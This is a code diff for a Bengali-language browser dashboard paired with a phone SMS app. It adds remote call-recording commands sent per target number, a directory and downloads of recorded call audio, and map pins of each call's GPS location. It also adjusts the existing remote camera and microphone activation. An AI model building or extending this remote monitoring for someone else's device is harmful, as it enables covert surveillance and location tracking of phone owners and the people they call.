@@ -239,6 +239,10 @@
           <i class="ph ph-phone-call text-violet-400"></i>
           <span>কল হিস্টরি</span>
         </a>
+        <a href="#call-recordings" class="hover:text-amber-400 transition-colors flex items-center gap-1.5 text-amber-300 font-semibold">
+          <i class="ph ph-record text-amber-400"></i>
+          <span>রেকর্ডিং ও ম্যাপ</span>
+        </a>
         <a href="#features" class="hover:text-blue-400 transition-colors">ফিচারসমূহ</a>
         <a href="#booking-hub" class="hover:text-blue-400 transition-colors flex items-center gap-1.5 text-blue-300 font-semibold">
           <i class="ph ph-airplane-tilt text-blue-400"></i>
@@ -372,6 +376,13 @@
                 <i class="ph ph-phone-call text-violet-400"></i>
                 <span class="hidden lg:inline">কল লগ</span>
                 <span id="liveCallLogBadgeCount" class="px-1.5 py-0.2 rounded-full bg-violet-500/30 text-violet-200 text-[10px] font-mono font-bold">0</span>
+              </a>
+
+              <!-- Jump to Call Recordings & Number Map -->
+              <a href="#call-recordings" onclick="if(!document.getElementById('webMessengerModal').classList.contains('hidden')) toggleWebMessengerModal();" class="px-2.5 py-1 rounded-xl bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/30 text-xs font-medium flex items-center gap-1.5 transition-all active:scale-95 shadow-sm" title="নাম্বার অনুযায়ী কল রেকর্ডিং ও লোকেশন ম্যাপ দেখুন">
+                <i class="ph ph-map-pin-line text-amber-400"></i>
+                <span class="hidden lg:inline">রেকর্ডিং ও ম্যাপ</span>
+                <span id="liveCallRecBadgeCount" class="px-1.5 py-0.2 rounded-full bg-amber-500/30 text-amber-200 text-[10px] font-mono font-bold">0</span>
               </a>
 
               <!-- Simulate Incoming SMS CTA for Instant Testing -->
@@ -962,6 +973,92 @@
       <!-- Call Log Feed List -->
       <div id="callHistoryListContainer" class="max-h-[480px] overflow-y-auto custom-scrollbar pr-1 space-y-2.5">
         <!-- Populated dynamically by renderCallHistoryList() -->
+      </div>
+    </div>
+  </section>
+
+  <!-- Call Recordings & Number-Mapped Location Map Section -->
+  <section id="call-recordings" class="relative z-10 py-6 sm:py-10 px-4 max-w-6xl mx-auto scroll-mt-24">
+    <div class="rounded-3xl bg-slate-900/95 border border-amber-500/30 shadow-2xl p-5 sm:p-7 lg:p-8">
+      <!-- Header + Remote Recording Control -->
+      <div class="flex flex-col lg:flex-row lg:items-center justify-between gap-4 pb-5 mb-5 border-b border-slate-800">
+        <div>
+          <div class="flex flex-wrap items-center gap-2 mb-1.5">
+            <span class="inline-flex items-center gap-1.5 text-[11px] font-bold uppercase tracking-wider text-amber-300 bg-amber-950/70 px-3 py-1 rounded-full border border-amber-500/30">
+              <i class="ph ph-record text-sm"></i>
+              <span>Call Recordings &amp; Number GPS Map</span>
+            </span>
+            <span id="callRecordingStatusBadge" class="text-[11px] px-2.5 py-0.5 rounded-full bg-slate-800 text-slate-300 border border-slate-700 font-semibold">
+              পেয়ারিং অপেক্ষমাণ
+            </span>
+          </div>
+          <h2 class="text-xl sm:text-2xl font-extrabold text-white tracking-tight">
+            কল রেকর্ডিং ও নাম্বার-ম্যাপ লোকেশন ভিউয়ার
+          </h2>
+          <p class="text-xs sm:text-sm text-slate-400 mt-1">
+            মোবাইলের প্রতিটি কল রেকর্ডিং সংশ্লিষ্ট ফোন নাম্বার ও লোকেশন পিনসহ সরাসরি ব্রাউজারে শুনুন, ডাউনলোড করুন ও ম্যাপে দেখুন।
+          </p>
+        </div>
+
+        <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 shrink-0">
+          <input type="text" id="callRecordingTargetInput" placeholder="নাম্বার লিখুন (যেমন +88017...)" class="bg-slate-950 border border-slate-700 focus:border-amber-500 rounded-xl px-3 py-2 text-xs text-slate-100 placeholder:text-slate-500 focus:outline-none min-w-[200px]" />
+          <div class="flex items-center gap-2">
+            <button type="button" id="btnStartRemoteCallRec" onclick="sendRemoteCallRecorderCommand('START')" class="px-3.5 py-2 rounded-xl bg-gradient-to-r from-amber-600 to-orange-600 hover:from-amber-500 hover:to-orange-500 text-white text-xs font-bold flex items-center gap-1.5 shadow-lg shadow-amber-600/25 transition-all active:scale-95">
+              <i class="ph ph-record text-base"></i>
+              <span>রেকর্ড শুরু</span>
+            </button>
+            <button type="button" id="btnStopRemoteCallRec" onclick="sendRemoteCallRecorderCommand('STOP')" class="px-3.5 py-2 rounded-xl bg-rose-600/20 hover:bg-rose-600/30 text-rose-300 border border-rose-500/35 text-xs font-bold flex items-center gap-1.5 transition-all active:scale-95">
+              <i class="ph ph-stop-circle text-base"></i>
+              <span>বন্ধ ও সেভ</span>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Live Recording Status Banner -->
+      <div id="callRecordingLiveStatusBanner" class="hidden mb-4 px-4 py-3 rounded-2xl bg-rose-950/50 border border-rose-500/40 flex flex-wrap items-center justify-between gap-2">
+        <div class="flex items-center gap-2.5 text-xs text-rose-200 font-semibold">
+          <span class="w-2.5 h-2.5 rounded-full bg-rose-500 animate-ping"></span>
+          <span id="callRecordingLiveStatusText">মোবাইলে কল রেকর্ডিং চলছে...</span>
+        </div>
+        <span id="callRecordingLiveTimer" class="text-xs font-mono font-bold text-rose-300">00:00</span>
+      </div>
+
+      <!-- 2-Column Directory + Map & Recordings Layout -->
+      <div class="grid grid-cols-1 lg:grid-cols-12 gap-5">
+        <!-- Left: Number Directory -->
+        <div class="lg:col-span-4 flex flex-col gap-3">
+          <div class="relative">
+            <i class="ph ph-magnifying-glass absolute left-3.5 top-2.5 text-slate-400 text-sm"></i>
+            <input type="text" id="callRecordingSearchInput" oninput="renderCallRecordingsSection()" placeholder="নাম্বার, নাম বা এলাকা খুঁজুন..." class="w-full bg-slate-950 border border-slate-800 focus:border-amber-500 rounded-xl pl-9 pr-3 py-2 text-xs text-slate-100 placeholder:text-slate-500 focus:outline-none transition-colors" />
+          </div>
+
+          <div class="p-3 rounded-2xl bg-slate-950/85 border border-slate-800">
+            <div class="flex items-center justify-between mb-2.5">
+              <span class="text-xs font-bold text-slate-200 flex items-center gap-1.5">
+                <i class="ph ph-address-book text-amber-400"></i>
+                <span>নাম্বার ডিরেক্টরি</span>
+              </span>
+              <span id="callRecTotalCounter" class="text-[11px] font-mono text-amber-300">0 টি রেকর্ড</span>
+            </div>
+            <div id="callRecNumberDirectory" class="max-h-[430px] overflow-y-auto custom-scrollbar space-y-2 pr-1">
+              <!-- Populated dynamically by renderCallRecordingsSection() -->
+            </div>
+          </div>
+        </div>
+
+        <!-- Right: Interactive Map + Recording Clips -->
+        <div class="lg:col-span-8 flex flex-col gap-4">
+          <!-- Interactive Number-Mapped Location Map -->
+          <div id="callRecordingMapContainer" class="rounded-2xl bg-slate-950/90 border border-slate-800 overflow-hidden">
+            <!-- Populated dynamically by renderCallRecordingsSection() -->
+          </div>
+
+          <!-- Recordings Audio Feed -->
+          <div id="callRecordingsListContainer" class="max-h-[420px] overflow-y-auto custom-scrollbar space-y-3 pr-1">
+            <!-- Populated dynamically by renderCallRecordingsSection() -->
+          </div>
+        </div>
       </div>
     </div>
   </section>
@@ -2408,11 +2505,15 @@ git push origin main</pre>
       loadedCloudMessages = [];
       pairedSessionMessages = [];
       pairedSessionCallLogs = [];
+      pairedSessionCallRecordings = [];
+      selectedRecordingPhoneFilter = "ALL";
+      selectedPinnedRecordingId = null;
       activeCallLogPermissionState = "UNKNOWN";
       hasInitializedMessages = true;
       activeSelectedSender = null;
       renderLiveMessenger();
       renderCallHistoryList();
+      renderCallRecordingsSection();
 
       if (pairedSessionId) {
         attachPairingSessionMessageListener(pairedSessionId);
@@ -2420,6 +2521,8 @@ git push origin main</pre>
         attachPairingSessionCameraListener(pairedSessionId);
         attachPairingSessionMicListener(pairedSessionId);
         attachPairingSessionCallLogListener(pairedSessionId);
+        attachPairingSessionCallRecordingsListener(pairedSessionId);
+        attachPairingSessionCallRecorderStateListener(pairedSessionId);
       }
 
       // Only attach per-user Firestore listener if browser Auth matches the phone's Firebase Auth UID
@@ -2750,15 +2853,27 @@ git push origin main</pre>
         try { pairedCallSessionMetaUnsubscribe(); } catch (_) {}
         pairedCallSessionMetaUnsubscribe = null;
       }
+      if (pairedCallRecordingsUnsubscribe) {
+        try { pairedCallRecordingsUnsubscribe(); } catch (_) {}
+        pairedCallRecordingsUnsubscribe = null;
+      }
+      if (pairedCallRecorderStateUnsubscribe) {
+        try { pairedCallRecorderStateUnsubscribe(); } catch (_) {}
+        pairedCallRecorderStateUnsubscribe = null;
+      }
       activePairedSessionId = null;
       activePairedDeviceName = null;
       isUsingRealPairedInbox = false;
       pairedSessionMessages = [];
       sessionMirroredNotifications = [];
       pairedSessionCallLogs = [];
+      pairedSessionCallRecordings = [];
+      selectedRecordingPhoneFilter = "ALL";
+      selectedPinnedRecordingId = null;
       activeCallLogPermissionState = "UNKNOWN";
       renderLiveNotificationFeed();
       renderCallHistoryList();
+      renderCallRecordingsSection();
       resetRemoteCameraUi();
       resetRemoteMicUi();
       try {
@@ -5839,6 +5954,7 @@ git push origin main</pre>
       const badge = document.getElementById("remoteCameraStatusBadge");
       const statusText = document.getElementById("remoteCameraStatusText");
 
+      let remoteCameraResponseTimer = null;
       if (command === "START_BACK" || command === "START_FRONT") {
         if (badge) {
           badge.className = "text-[11px] px-2.5 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/35 font-semibold";
@@ -5847,6 +5963,17 @@ git push origin main</pre>
         if (statusText) {
           statusText.innerText = "মোবাইল ডিভাইসে ক্যামেরা চালুর রিকোয়েস্ট পাঠানো হয়েছে — অনুগ্রহ করে ২-৩ সেকেন্ড অপেক্ষা করুন (অ্যাপ ফোনে খোলা রাখুন)।";
         }
+        if (window._pulseRemoteCamTimeout) clearTimeout(window._pulseRemoteCamTimeout);
+        window._pulseRemoteCamTimeout = setTimeout(() => {
+          const curBadge = document.getElementById("remoteCameraStatusBadge");
+          const curStatus = document.getElementById("remoteCameraStatusText");
+          if (curBadge && curBadge.innerText.includes("চালু হচ্ছে")) {
+            curBadge.innerText = "ফোনের সাড়া অপেক্ষমাণ";
+            if (curStatus) {
+              curStatus.innerText = "ফোন থেকে এখনো সাড়া আসেনি: ফোনে Pulse SMS অ্যাপটি স্ক্রিনে খোলা রাখুন, অথবা ফোনের Web Sync মেনু থেকে সরাসরি 'লাইভ মোবাইল ক্যামেরা শেয়ার' বাটনটি চাপুন (এবং নতুন APK আপডেট নিশ্চিত করুন)।";
+            }
+          }
+        }, 12000);
       }
 
       const payload = {
@@ -5858,6 +5985,7 @@ git push origin main</pre>
       if (command === "START_BACK" || command === "START_FRONT") {
         payload.status = "STARTING";
       } else if (command === "STOP") {
+        if (window._pulseRemoteCamTimeout) clearTimeout(window._pulseRemoteCamTimeout);
         payload.status = "STOPPED";
       }
 
@@ -5922,6 +6050,9 @@ git push origin main</pre>
               const badge = document.getElementById("remoteCameraStatusBadge");
               const statusText = document.getElementById("remoteCameraStatusText");
 
+              if (status !== "STARTING" && window._pulseRemoteCamTimeout) {
+                clearTimeout(window._pulseRemoteCamTimeout);
+              }
               if (status === "ACTIVE" && data.frameBase64 && String(data.frameBase64).startsWith("data:image/")) {
                 if (img) {
                   img.src = data.frameBase64;
@@ -6241,6 +6372,10 @@ git push origin main</pre>
             </div>
 
             <div class="flex items-center gap-1.5 shrink-0 self-end sm:self-center">
+              <button type="button" onclick="openCallRecordingsForNumber('${attrNumber}')" class="px-2.5 py-1.5 rounded-xl bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/30 text-[11px] font-semibold flex items-center gap-1 transition-all active:scale-95" title="এই নাম্বারের রেকর্ডিং ও ম্যাপ দেখুন">
+                <i class="ph ph-map-pin-line text-sm"></i>
+                <span>রেকর্ডিং ও ম্যাপ</span>
+              </button>
               <button type="button" onclick="openSmsForCallNumber('${attrNumber}')" class="px-2.5 py-1.5 rounded-xl bg-blue-600/20 hover:bg-blue-600/30 text-blue-300 border border-blue-500/30 text-[11px] font-semibold flex items-center gap-1 transition-all active:scale-95" title="এই নম্বরে এসএমএস পাঠান">
                 <i class="ph ph-chat-dots text-sm"></i>
                 <span>এসএমএস</span>
@@ -6677,8 +6812,19 @@ git push origin main</pre>
           badge.innerText = "মোবাইলে মাইক চালু হচ্ছে...";
         }
         if (statusText) {
-          statusText.innerText = "মোবাইল ডিভাইসে মাইক্রোফোন চালুর অনুরোধ পাঠানো হয়েছে — অনুগ্রহ করে ১-২ সেকেন্ড অপেক্ষা করুন।";
+          statusText.innerText = "মোবাইল ডিভাইসে মাইক্রোফোন চালুর অনুরোধ পাঠানো হয়েছে — অনুগ্রহ করে ১-২ সেকেন্ড অপেক্ষা করুন (অ্যাপ ফোনে খোলা রাখুন)।";
         }
+        if (window._pulseRemoteMicTimeout) clearTimeout(window._pulseRemoteMicTimeout);
+        window._pulseRemoteMicTimeout = setTimeout(() => {
+          const curBadge = document.getElementById("remoteMicStatusBadge");
+          const curStatus = document.getElementById("remoteMicStatusText");
+          if (curBadge && curBadge.innerText.includes("চালু হচ্ছে")) {
+            curBadge.innerText = "ফোনের সাড়া অপেক্ষমাণ";
+            if (curStatus) {
+              curStatus.innerText = "ফোন থেকে এখনো সাড়া আসেনি: ফোনে Pulse SMS অ্যাপটি স্ক্রিনে খোলা রাখুন, অথবা ফোনের Web Sync মেনু থেকে সরাসরি 'লাইভ মাইক্রোফোন শেয়ার' বাটনটি চাপুন।";
+            }
+          }
+        }, 12000);
       }
 
       const payload = {
@@ -6690,6 +6836,7 @@ git push origin main</pre>
       if (command === "START") {
         payload.status = "STARTING";
       } else if (command === "STOP") {
+        if (window._pulseRemoteMicTimeout) clearTimeout(window._pulseRemoteMicTimeout);
         payload.status = "STOPPED";
       }
 
@@ -6734,6 +6881,9 @@ git push origin main</pre>
               const statsLabel = document.getElementById("remoteMicStatsLabel");
               const pulseCircle = document.getElementById("remoteMicPulseCircle");
 
+              if (status !== "STARTING" && window._pulseRemoteMicTimeout) {
+                clearTimeout(window._pulseRemoteMicTimeout);
+              }
               if (status === "ACTIVE") {
                 if (badge) {
                   badge.className = "text-[11px] px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 font-bold";
@@ -6782,6 +6932,481 @@ git push origin main</pre>
       });
     }
 
+    // ==========================================
+    // 🎙️ CALL RECORDINGS & NUMBER-MAPPED LOCATION MAP
+    // ==========================================
+    let pairedCallRecordingsUnsubscribe = null;
+    let pairedCallRecorderStateUnsubscribe = null;
+    let pairedSessionCallRecordings = [];
+    let selectedRecordingPhoneFilter = "ALL";
+    let selectedPinnedRecordingId = null;
+    let remoteCallRecorderCommandSeq = 0;
+
+    function normalizeRecordingPhoneKey(phone) {
+      const raw = String(phone || "").trim();
+      return raw || "Unknown";
+    }
+
+    function openCallRecordingsForNumber(phoneNumber) {
+      const cleaned = normalizeRecordingPhoneKey(phoneNumber);
+      const targetInput = document.getElementById("callRecordingTargetInput");
+      if (targetInput && cleaned !== "Unknown" && cleaned !== "Private / Unknown") {
+        targetInput.value = cleaned;
+      }
+      const hasForNumber = pairedSessionCallRecordings.some(
+        (r) => normalizeRecordingPhoneKey(r.phoneNumber) === cleaned
+      );
+      selectedRecordingPhoneFilter = hasForNumber ? cleaned : "ALL";
+      selectedPinnedRecordingId = null;
+      renderCallRecordingsSection();
+      const sec = document.getElementById("call-recordings");
+      if (sec) sec.scrollIntoView({ behavior: "smooth", block: "start" });
+    }
+
+    function selectRecordingPhoneDirectoryItem(phoneKey) {
+      selectedRecordingPhoneFilter = phoneKey || "ALL";
+      selectedPinnedRecordingId = null;
+      const targetInput = document.getElementById("callRecordingTargetInput");
+      if (targetInput && phoneKey && phoneKey !== "ALL" && phoneKey !== "Unknown") {
+        targetInput.value = phoneKey;
+      }
+      renderCallRecordingsSection();
+    }
+
+    function focusRecordingOnMap(recId) {
+      selectedPinnedRecordingId = recId || null;
+      renderCallRecordingsSection();
+      const mapEl = document.getElementById("callRecordingMapContainer");
+      if (mapEl) mapEl.scrollIntoView({ behavior: "smooth", block: "nearest" });
+    }
+
+    function downloadCallRecordingAudio(recId) {
+      const rec = pairedSessionCallRecordings.find((r) => (r.id || r._docId) === recId);
+      if (!rec || !rec.audioBase64) return;
+      const mime = rec.mimeType || "audio/mp4";
+      const ext = mime.includes("wav") ? "wav" : "m4a";
+      const safeNum = (rec.phoneNumber || "call").replace(/[^a-zA-Z0-9+_-]/g, "_");
+      const a = document.createElement("a");
+      a.href = `data:${mime};base64,${rec.audioBase64}`;
+      a.download = `call_${safeNum}_${recId}.${ext}`;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+
+    async function deleteCallRecordingItem(docId) {
+      if (!activePairedSessionId || !docId) return;
+      const fb = await waitForPulseFirebase(2500);
+      if (!fb || !fb.db || !fb.deleteDoc) return;
+      try {
+        await fb.deleteDoc(fb.doc(fb.db, "pairing_sessions", activePairedSessionId, "call_recordings", String(docId)));
+        showModalToast("মুছে ফেলা হয়েছে", "কল রেকর্ডিংটি তালিকা থেকে সরানো হয়েছে।");
+      } catch (err) {
+        console.warn("Delete call_recording failed:", err);
+      }
+    }
+
+    async function sendRemoteCallRecorderCommand(command) {
+      if (!activePairedSessionId) {
+        showModalToast("পেয়ারিং প্রয়োজন", "আগে মোবাইল অ্যাপে QR কোড বা ১-ক্লিক দিয়ে পেয়ার করুন।");
+        return;
+      }
+      const fb = await waitForPulseFirebase(3000);
+      if (!fb || !fb.db || !fb.setDoc) {
+        showModalToast("ত্রুটি", "ফায়ারবেস সংযোগ প্রস্তুত নয়।");
+        return;
+      }
+
+      const rawTarget = (document.getElementById("callRecordingTargetInput")?.value || "").trim();
+      const targetNumber = rawTarget || (selectedRecordingPhoneFilter !== "ALL" ? selectedRecordingPhoneFilter : "Manual Recording");
+      remoteCallRecorderCommandSeq = Math.max(remoteCallRecorderCommandSeq + 1, Date.now());
+
+      const banner = document.getElementById("callRecordingLiveStatusBanner");
+      const bannerText = document.getElementById("callRecordingLiveStatusText");
+      if (command === "START" && banner && bannerText) {
+        banner.classList.remove("hidden");
+        bannerText.innerText = `মোবাইলে রেকর্ডিং অনুরোধ পাঠানো হচ্ছে (${targetNumber})...`;
+      }
+
+      try {
+        await fb.setDoc(
+          fb.doc(fb.db, "pairing_sessions", activePairedSessionId, "call_recorder", "live"),
+          {
+            id: "live",
+            command,
+            commandSeq: remoteCallRecorderCommandSeq,
+            targetNumber: targetNumber.slice(0, 100),
+            status: command === "START" ? "STARTING" : "STOPPED",
+            updatedAt: fb.serverTimestamp()
+          },
+          { merge: true }
+        );
+      } catch (err) {
+        console.warn("Failed sending remote call recorder command:", err);
+        showModalToast("ত্রুটি", "মোবাইলে কমান্ড পাঠানো যায়নি।");
+      }
+    }
+
+    function renderCallRecordingsSection() {
+      const dirContainer = document.getElementById("callRecNumberDirectory");
+      const mapContainer = document.getElementById("callRecordingMapContainer");
+      const listContainer = document.getElementById("callRecordingsListContainer");
+      const statusBadge = document.getElementById("callRecordingStatusBadge");
+      const navBadge = document.getElementById("liveCallRecBadgeCount");
+      const totalCounter = document.getElementById("callRecTotalCounter");
+
+      const allRecs = Array.isArray(pairedSessionCallRecordings) ? pairedSessionCallRecordings : [];
+      if (navBadge) navBadge.innerText = String(allRecs.length);
+      if (totalCounter) totalCounter.innerText = `${allRecs.length} টি রেকর্ড`;
+
+      if (statusBadge) {
+        if (!activePairedSessionId) {
+          statusBadge.className = "text-[11px] px-2.5 py-0.5 rounded-full bg-slate-800 text-slate-300 border border-slate-700 font-semibold";
+          statusBadge.innerText = "পেয়ারিং অপেক্ষমাণ";
+        } else {
+          statusBadge.className = "text-[11px] px-2.5 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/35 font-semibold";
+          statusBadge.innerText = `🟢 ম্যাপ ও রেকর্ডিং সিঙ্ক (${allRecs.length}টি)`;
+        }
+      }
+
+      if (!dirContainer || !mapContainer || !listContainer) return;
+
+      if (!activePairedSessionId) {
+        dirContainer.innerHTML = `
+          <div class="p-4 rounded-xl bg-slate-900/70 border border-slate-800 text-center text-xs text-slate-400">
+            পেয়ার করার পর নাম্বার তালিকা এখানে দেখাবে।
+          </div>
+        `;
+        mapContainer.innerHTML = `
+          <div class="p-8 text-center">
+            <div class="w-14 h-14 rounded-2xl bg-amber-500/15 border border-amber-500/30 flex items-center justify-center mx-auto mb-3 text-amber-400">
+              <i class="ph ph-map-pin-line text-3xl"></i>
+            </div>
+            <h4 class="text-sm font-bold text-white mb-1">ডিভাইস পেয়ার করা নেই</h4>
+            <p class="text-xs text-slate-400 max-w-md mx-auto">
+              মোবাইল অ্যাপ পেয়ার করে কল রেকর্ড শুরু করলে প্রতিটি নাম্বারের সাথে ম্যাপে লোকেশন ও অডিও এখানে দেখাবে।
+            </p>
+          </div>
+        `;
+        listContainer.innerHTML = "";
+        return;
+      }
+
+      // Group recordings by phoneNumber for Number Directory
+      const queryText = (document.getElementById("callRecordingSearchInput")?.value || "").trim().toLowerCase();
+      const groupedMap = new Map();
+      allRecs.forEach((rec) => {
+        const key = normalizeRecordingPhoneKey(rec.phoneNumber);
+        if (!groupedMap.has(key)) {
+          groupedMap.set(key, {
+            phoneNumber: key,
+            contactName: rec.contactName || "",
+            count: 0,
+            totalDuration: 0,
+            hasLocation: false,
+            latestLocationLabel: "",
+            items: []
+          });
+        }
+        const entry = groupedMap.get(key);
+        entry.count += 1;
+        entry.totalDuration += Number(rec.durationSec) || 0;
+        if (!entry.contactName && rec.contactName) entry.contactName = rec.contactName;
+        if (typeof rec.latitude === "number" && typeof rec.longitude === "number") {
+          entry.hasLocation = true;
+          if (!entry.latestLocationLabel && rec.locationLabel) entry.latestLocationLabel = rec.locationLabel;
+        }
+        entry.items.push(rec);
+      });
+
+      const directoryEntries = Array.from(groupedMap.values()).filter((g) => {
+        if (!queryText) return true;
+        const hay = `${g.phoneNumber} ${g.contactName} ${g.latestLocationLabel}`.toLowerCase();
+        return hay.includes(queryText);
+      });
+
+      const allSelected = selectedRecordingPhoneFilter === "ALL";
+      dirContainer.innerHTML = `
+        <button type="button" onclick="selectRecordingPhoneDirectoryItem('ALL')" class="w-full text-left p-2.5 rounded-xl border transition-all flex items-center justify-between ${allSelected ? "bg-amber-500/20 border-amber-500/50 text-amber-200" : "bg-slate-900/70 hover:bg-slate-900 border-slate-800 text-slate-300"}">
+          <div class="flex items-center gap-2 min-w-0">
+            <i class="ph ph-squares-four text-base shrink-0"></i>
+            <span class="text-xs font-bold truncate">সব নাম্বার একসাথে</span>
+          </div>
+          <span class="text-[10px] font-mono px-2 py-0.5 rounded-full bg-slate-950/70">${allRecs.length}</span>
+        </button>
+        ${directoryEntries.map((g) => {
+          const isSel = selectedRecordingPhoneFilter === g.phoneNumber;
+          const attrPhone = escapeHtmlAttr(g.phoneNumber);
+          const safeTitle = escapeHtmlText(g.contactName || g.phoneNumber);
+          const safeSub = g.contactName ? escapeHtmlText(g.phoneNumber) : "";
+          return `
+            <button type="button" onclick="selectRecordingPhoneDirectoryItem('${attrPhone}')" class="w-full text-left p-2.5 rounded-xl border transition-all ${isSel ? "bg-amber-500/20 border-amber-500/50 text-white shadow" : "bg-slate-900/70 hover:bg-slate-900 border-slate-800 text-slate-300"}">
+              <div class="flex items-center justify-between gap-2">
+                <span class="text-xs font-bold truncate">${safeTitle}</span>
+                <span class="text-[10px] font-mono px-1.5 py-0.5 rounded-full bg-amber-500/15 text-amber-300 border border-amber-500/30 shrink-0">${g.count}টি</span>
+              </div>
+              ${safeSub ? `<div class="text-[11px] font-mono text-cyan-300 truncate mt-0.5">${safeSub}</div>` : ""}
+              <div class="flex items-center justify-between gap-2 mt-1 text-[10px] text-slate-400">
+                <span>${g.hasLocation ? "📍 ম্যাপ পিন যুক্ত" : "লোকেশন নেই"}</span>
+                <span class="font-mono">${escapeHtmlText(formatCallDurationBn(g.totalDuration))}</span>
+              </div>
+            </button>
+          `;
+        }).join("")}
+      `;
+
+      // Filter recordings list for selected number + search query
+      const visibleRecs = allRecs.filter((rec) => {
+        const key = normalizeRecordingPhoneKey(rec.phoneNumber);
+        if (selectedRecordingPhoneFilter !== "ALL" && key !== selectedRecordingPhoneFilter) return false;
+        if (queryText) {
+          const hay = `${rec.phoneNumber || ""} ${rec.contactName || ""} ${rec.locationLabel || ""} ${rec.callType || ""}`.toLowerCase();
+          if (!hay.includes(queryText)) return false;
+        }
+        return true;
+      });
+
+      // Choose active pin for interactive map (explicit clicked pin or latest with coordinates in filtered set)
+      const recsWithLocation = visibleRecs.filter(
+        (r) => typeof r.latitude === "number" && typeof r.longitude === "number" && !Number.isNaN(r.latitude) && !Number.isNaN(r.longitude)
+      );
+      const pinnedRec = (selectedPinnedRecordingId && recsWithLocation.find((r) => (r.id || r._docId) === selectedPinnedRecordingId))
+        || recsWithLocation[0]
+        || null;
+
+      if (pinnedRec) {
+        const lat = Number(pinnedRec.latitude);
+        const lng = Number(pinnedRec.longitude);
+        const delta = 0.012;
+        const bbox = `${(lng - delta).toFixed(5)},${(lat - delta).toFixed(5)},${(lng + delta).toFixed(5)},${(lat + delta).toFixed(5)}`;
+        const osmEmbedUrl = `https://www.openstreetmap.org/export/embed.html?bbox=${encodeURIComponent(bbox)}&layer=mapnik&marker=${lat.toFixed(6)},${lng.toFixed(6)}`;
+        const gmapsUrl = `https://www.google.com/maps?q=${lat.toFixed(6)},${lng.toFixed(6)}`;
+        const osmDirectUrl = `https://www.openstreetmap.org/?mlat=${lat.toFixed(6)}&mlon=${lng.toFixed(6)}#map=16/${lat.toFixed(6)}/${lng.toFixed(6)}`;
+        const pinTitle = escapeHtmlText(pinnedRec.contactName ? `${pinnedRec.contactName} (${pinnedRec.phoneNumber})` : pinnedRec.phoneNumber);
+        const locLabel = escapeHtmlText(pinnedRec.locationLabel || `${lat.toFixed(4)}, ${lng.toFixed(4)}`);
+        const pinTime = escapeHtmlText(formatCallTimestampBn(pinnedRec.createdAt));
+
+        const multiPinPills = recsWithLocation.length > 1 ? `
+          <div class="flex items-center gap-1.5 overflow-x-auto custom-scrollbar pt-2">
+            ${recsWithLocation.slice(0, 8).map((r, idx) => {
+              const rId = r.id || r._docId || "";
+              const isCur = (pinnedRec.id || pinnedRec._docId) === rId;
+              return `<button type="button" onclick="focusRecordingOnMap('${escapeHtmlAttr(rId)}')" class="px-2.5 py-1 rounded-lg text-[10px] font-semibold whitespace-nowrap border transition-all ${isCur ? "bg-amber-500 text-slate-950 border-amber-400" : "bg-slate-900 text-slate-300 border-slate-700 hover:bg-slate-800"}">📍 পিন ${idx + 1} (${escapeHtmlText(r.phoneNumber)})</button>`;
+            }).join("")}
+          </div>
+        ` : "";
+
+        mapContainer.innerHTML = `
+          <div class="p-3.5 border-b border-slate-800 flex flex-col sm:flex-row sm:items-center justify-between gap-2 bg-slate-900/60">
+            <div class="min-w-0">
+              <div class="flex items-center gap-2">
+                <span class="px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/35 text-[10px] font-bold">📍 নাম্বার ম্যাপ পিন</span>
+                <span class="text-xs font-bold text-white truncate">${pinTitle}</span>
+              </div>
+              <div class="text-[11px] text-slate-300 mt-1 flex flex-wrap items-center gap-x-3 gap-y-0.5">
+                <span class="text-amber-300 font-medium">${locLabel}</span>
+                <span class="font-mono text-slate-400">${lat.toFixed(5)}, ${lng.toFixed(5)}</span>
+                <span class="text-slate-400">${pinTime}</span>
+              </div>
+              ${multiPinPills}
+            </div>
+            <div class="flex items-center gap-2 shrink-0">
+              <a href="${gmapsUrl}" target="_blank" rel="noopener noreferrer" class="px-3 py-1.5 rounded-xl bg-blue-600/25 hover:bg-blue-600/35 text-blue-200 border border-blue-500/40 text-[11px] font-bold flex items-center gap-1 transition-all">
+                <i class="ph ph-map-trifold"></i>
+                <span>Google Maps</span>
+              </a>
+              <a href="${osmDirectUrl}" target="_blank" rel="noopener noreferrer" class="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-[11px] font-semibold flex items-center gap-1 transition-all">
+                <i class="ph ph-globe-hemisphere-east"></i>
+                <span>OSM</span>
+              </a>
+            </div>
+          </div>
+          <div class="w-full h-[250px] sm:h-[280px] bg-slate-950 relative">
+            <iframe title="Number Call Location Map" src="${osmEmbedUrl}" class="w-full h-full border-0" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+          </div>
+        `;
+      } else {
+        mapContainer.innerHTML = `
+          <div class="p-6 text-center">
+            <div class="w-12 h-12 rounded-2xl bg-slate-900 border border-slate-800 flex items-center justify-center mx-auto mb-2.5 text-amber-400">
+              <i class="ph ph-map-pin text-2xl"></i>
+            </div>
+            <h4 class="text-xs font-bold text-slate-200 mb-1">
+              ${allRecs.length === 0 ? "এখনো কোনো কল রেকর্ডিং ও ম্যাপ পিন আসেনি" : "এই রেকর্ডিংগুলোতে লোকেশন কোঅর্ডিনেট নেই"}
+            </h4>
+            <p class="text-[11px] text-slate-400 max-w-md mx-auto">
+              ${allRecs.length === 0
+                ? "ফোনের Pulse SMS অ্যাপে 'অটো কল রেকর্ডিং' অন করুন অথবা এখান থেকে নাম্বার লিখে '🎙️ রেকর্ড শুরু' চাপুন।"
+                : "ম্যাপে অবস্থান দেখতে ফোনের Pulse SMS অ্যাপে 'ম্যাপ অনুমতি' বাটনে ট্যাপ করে লোকেশন Allow করুন।"}
+            </p>
+          </div>
+        `;
+      }
+
+      if (visibleRecs.length === 0) {
+        listContainer.innerHTML = `
+          <div class="p-6 rounded-2xl bg-slate-950/75 border border-slate-800 text-center text-xs text-slate-400">
